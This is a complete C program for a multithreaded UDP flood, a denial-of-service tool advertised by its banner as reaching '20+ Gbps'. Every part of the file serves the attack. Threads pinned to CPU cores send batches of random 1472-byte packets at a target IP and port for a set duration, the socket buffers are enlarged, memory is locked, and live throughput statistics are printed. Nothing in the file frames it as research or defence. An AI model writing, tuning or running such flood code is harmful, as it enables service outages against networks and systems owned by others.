#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <errno.h>
#include <sys/time.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sched.h>

#define BUFFER_SIZE 1472  // Optimal for 1500 MTU
#define MAX_THREADS 200
#define BATCH_SIZE 1000
#define STATS_INTERVAL 1

typedef struct {
    char ip[16];
    int port;
    int duration;
    int thread_id;
    int cpu_core;
    long packet_count;
    long total_bytes;
} flood_args_t;

volatile sig_atomic_t keep_running = 1;
volatile long global_packets = 0;
volatile long global_bytes = 0;
time_t global_start_time;

// Memory-aligned buffer structure
typedef struct {
    char data[BUFFER_SIZE];
} __attribute__((aligned(64))) packet_buffer_t;

void handle_signal(int sig) {
    keep_running = 0;
    printf("\nShutting down gracefully...\n");
}

// Set thread CPU affinity
void set_cpu_affinity(int cpu_core) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu_core, &cpuset);
    pthread_t current_thread = pthread_self();
    pthread_setaffinity_np(current_thread, sizeof(cpu_set_t), &cpuset);
}

// High-resolution timestamp
inline long long get_time_ns() {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (long long)ts.tv_sec * 1000000000LL + ts.tv_nsec;
}

void *stats_thread(void *arg) {
    set_cpu_affinity(0);
    time_t last_time = time(NULL);
    long last_packets = 0;
    long last_bytes = 0;
    
    while (keep_running) {
        sleep(STATS_INTERVAL);
        
        time_t current_time = time(NULL);
        long current_packets = __sync_fetch_and_add(&global_packets, 0);
        long current_bytes = __sync_fetch_and_add(&global_bytes, 0);
        long interval_packets = current_packets - last_packets;
        long interval_bytes = current_bytes - last_bytes;
        double interval_seconds = difftime(current_time, last_time);
        
        if (interval_seconds > 0) {
            double pps = interval_packets / interval_seconds;
            double gbps = (interval_bytes * 8.0) / (interval_seconds * 1000000000);
            double total_gb = (double)current_bytes / (1000000000);
            
            printf("[STATS] PPS: %.0f | Gbps: %.2f | Total: %.2f GB | Time: %lds\n", 
                   pps, gbps, total_gb, (current_time - global_start_time));
        }
        
        last_packets = current_packets;
        last_bytes = current_bytes;
        last_time = current_time;
    }
    return NULL;
}

void *udp_flood(void *args) {
    flood_args_t *flood_args = (flood_args_t *)args;
    const char *ip = flood_args->ip;
    int port = flood_args->port;
    int duration = flood_args->duration;
    int thread_id = flood_args->thread_id;
    int cpu_core = flood_args->cpu_core;
    
    // Set CPU affinity for this thread
    set_cpu_affinity(cpu_core);
    
    int sock;
    struct sockaddr_in target;
    socklen_t target_len = sizeof(target);

    // Create raw socket with maximum performance
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        free(args);
        return NULL;
    }

    // Ultra-aggressive socket optimization
    int sock_opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &sock_opt, sizeof(sock_opt));
    
    // Maximum buffer sizes
    int sendbuf = 64 * 1024 * 1024;  // 64MB buffer
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sendbuf, sizeof(sendbuf));
    
    // Non-blocking mode
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target.sin_addr) <= 0) {
        perror("Invalid address");
        close(sock);
        free(args);
        return NULL;
    }

    // Pre-allocate and lock memory for performance
    packet_buffer_t *buffers = malloc(BATCH_SIZE * sizeof(packet_buffer_t));
    if (!buffers) {
        perror("Buffer allocation failed");
        close(sock);
        free(args);
        return NULL;
    }
    
    // Lock memory to prevent swapping
    mlock(buffers, BATCH_SIZE * sizeof(packet_buffer_t));
    
    // Initialize buffers with high-entropy data from /dev/urandom
    FILE *urandom = fopen("/dev/urandom", "rb");
    if (urandom) {
        for (int i = 0; i < BATCH_SIZE; i++) {
            size_t bytes_read = fread(buffers[i].data, 1, BUFFER_SIZE, urandom);
            if (bytes_read != BUFFER_SIZE) {
                // Fill remaining with random if short read
                for (int j = bytes_read; j < BUFFER_SIZE; j++) {
                    buffers[i].data[j] = (char)(rand() % 256);
                }
            }
        }
        fclose(urandom);
    } else {
        // Fallback: pseudo-random with thread-specific seed
        srand(time(NULL) + thread_id);
        for (int i = 0; i < BATCH_SIZE; i++) {
            for (int j = 0; j < BUFFER_SIZE; j++) {
                buffers[i].data[j] = (char)(rand() % 256);
            }
        }
    }

    time_t start_time = time(NULL);
    time_t end_time = start_time + duration;
    long thread_packets = 0;
    long thread_bytes = 0;
    int consecutive_errors = 0;
    int buffer_index = 0;
    
    printf("Thread %d (CPU %d) started - Target: %s:%d\n", 
           thread_id, cpu_core, ip, port);
    
    // ULTRA-HIGH PERFORMANCE FLOOD LOOP
    while (keep_running && time(NULL) < end_time) {
        int batch_sent = 0;
        
        // Send batch of packets
        for (int i = 0; i < BATCH_SIZE; i++) {
            ssize_t sent = sendto(sock, buffers[buffer_index].data, BUFFER_SIZE, 
                                 MSG_DONTWAIT, (struct sockaddr *)&target, target_len);
            
            if (sent > 0) {
                batch_sent++;
                thread_packets++;
                thread_bytes += sent;
                consecutive_errors = 0;
                
                // Rotate through buffers
                buffer_index = (buffer_index + 1) % BATCH_SIZE;
            } else {
                if (errno == EAGAIN || errno == EWOULDBLOCK) {
                    // Buffer full, continue with next packet
                    continue;
                } else if (errno == ENOBUFS) {
                    // System buffer full, minimal delay
                    usleep(10);
                    consecutive_errors++;
                    if (consecutive_errors > 100) {
                        usleep(100);
                    }
                    continue;
                } else {
                    consecutive_errors++;
                    if (consecutive_errors > 1000) {
                        printf("Thread %d too many errors, continuing...\n", thread_id);
                        consecutive_errors = 0;
                    }
                }
            }
        }
        
        // Batch update global stats to reduce atomic operation overhead
        if (batch_sent > 0) {
            __sync_fetch_and_add(&global_packets, batch_sent);
            __sync_fetch_and_add(&global_bytes, batch_sent * BUFFER_SIZE);
        }
        
        // Aggressive retry on partial batch sends
        if (batch_sent < BATCH_SIZE / 2) {
            usleep(100); // Small delay if sending is struggling
        }
    }

    // Final stats update
    if (thread_packets > 0) {
        __sync_fetch_and_add(&global_packets, thread_packets);
        __sync_fetch_and_add(&global_bytes, thread_packets * BUFFER_SIZE);
    }

    close(sock);
    munlock(buffers, BATCH_SIZE * sizeof(packet_buffer_t));
    free(buffers);
    printf("Thread %d finished - Packets: %ld (%.2f GB)\n", 
           thread_id, thread_packets, (double)(thread_packets * BUFFER_SIZE) / 1000000000);
    free(args);
    return NULL;
}

void print_banner() {
    printf("\n");
    printf("╔══════════════════════════════════════════════════╗\n");
    printf("║           ULTRA HIGH-PERFORMANCE UDP FLOOD      ║\n");
    printf("║                 [20+ Gbps EDITION]              ║\n");
    printf("╚══════════════════════════════════════════════════╝\n");
    printf("\n");
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        printf("Example: %s 192.168.1.1 80 60 50\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    print_banner();
    
    // Setup signal handling
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    const char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int num_threads = atoi(argv[4]);

    if (num_threads > MAX_THREADS) {
        printf("Warning: Limiting threads to %d\n", MAX_THREADS);
        num_threads = MAX_THREADS;
    }

    if (num_threads < 1) {
        printf("Error: Thread count must be at least 1\n");
        exit(EXIT_FAILURE);
    }

    printf("[INFO] Target: %s:%d\n", ip, port);
    printf("[INFO] Duration: %d seconds\n", duration);
    printf("[INFO] Threads: %d\n", num_threads);
    printf("[INFO] Buffer size: %d bytes\n", BUFFER_SIZE);
    printf("[INFO] Batch size: %d packets\n", BATCH_SIZE);
    printf("[INFO] Starting attack in 3 seconds...\n");
    sleep(3);

    global_start_time = time(NULL);
    pthread_t threads[MAX_THREADS];
    pthread_t stats_thr;

    // Start statistics thread
    if (pthread_create(&stats_thr, NULL, stats_thread, NULL) != 0) {
        perror("Could not create stats thread");
        exit(EXIT_FAILURE);
    }

    // Create flood threads with CPU affinity
    int threads_created = 0;
    int cpu_cores = sysconf(_SC_NPROCESSORS_ONLN);
    
    for (int i = 0; i < num_threads; i++) {
        flood_args_t *args = calloc(1, sizeof(flood_args_t));
        if (!args) {
            perror("Memory allocation failed");
            continue;
        }
        
        strncpy(args->ip, ip, sizeof(args->ip) - 1);
        args->ip[sizeof(args->ip) - 1] = '\0';
        args->port = port;
        args->duration = duration;
        args->thread_id = i + 1;
        args->cpu_core = i % cpu_cores; // Distribute across CPU cores

        if (pthread_create(&threads[i], NULL, udp_flood, (void *)args) == 0) {
            threads_created++;
        } else {
            perror("Could not create thread");
            free(args);
        }
        
        // Minimal stagger
        usleep(100);
    }

    printf("[INFO] Created %d flood threads across %d CPU cores\n", threads_created, cpu_cores);
    
    // Wait for all threads to complete
    for (int i = 0; i < threads_created; i++) {
        pthread_join(threads[i], NULL);
    }

    keep_running = 0;
    pthread_join(stats_thr, NULL);

    // Final statistics
    time_t total_time = time(NULL) - global_start_time;
    if (total_time == 0) total_time = 1;
    double avg_pps = (double)global_packets / total_time;
    double total_gb = (double)global_bytes / 1000000000;
    double avg_gbps = (total_gb * 8) / total_time;
    
    printf("\n╔══════════════════════════════════════════════════╗\n");
    printf("║                 FINAL STATS                     ║\n");
    printf("╠══════════════════════════════════════════════════╣\n");
    printf("║ Total Packets: %-32ld ║\n", global_packets);
    printf("║ Total Data:    %-8.2f GB                 ║\n", total_gb);
    printf("║ Duration:      %-8ld seconds            ║\n", total_time);
    printf("║ Average PPS:   %-8.0f packets/sec       ║\n", avg_pps);
    printf("║ Average Gbps:  %-8.2f Gbps              ║\n", avg_gbps);
    printf("╚══════════════════════════════════════════════════╝\n");

    return 0;
}